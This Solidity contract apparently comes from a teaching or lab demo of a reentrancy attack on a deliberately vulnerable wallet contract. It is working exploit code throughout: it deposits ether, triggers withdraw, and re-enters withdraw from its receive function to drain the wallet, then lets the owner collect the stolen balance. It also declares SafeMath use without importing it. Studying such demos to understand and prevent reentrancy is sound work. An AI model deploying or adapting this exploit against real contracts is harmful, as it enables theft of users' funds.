// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";
import "./VulReentrantWallet.sol";

contract MaliciousReentrantContract is Ownable {
    using SafeMath for uint256;

    VulReentrantWallet private _vulWallet;

    constructor(address vulWallet) public {
        _vulWallet = VulReentrantWallet(vulWallet);
    }

    // Attacker sends ether to the malicious smart contract
    function deposit() public payable {}

    // Attacker sends some ethers to the vulnerable wallet contract
    function callDepositOnVulWallet() public onlyOwner {
        _vulWallet.deposit{value: address(this).balance}();
    }

    // Attacker call this function for starting the reentrancy attack
    function callWithdrawOnVulWallet() public onlyOwner {
        _vulWallet.withdraw();
    }

    // receive function will be called by the vulnerable wallet contract
    receive() external payable {
        // balance du smart contract incrementé de amount
        _vulWallet.withdraw();
    }

    // Attacker can withdraw the ethers stored in the malicious smart contract
    function withdraw() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }
}
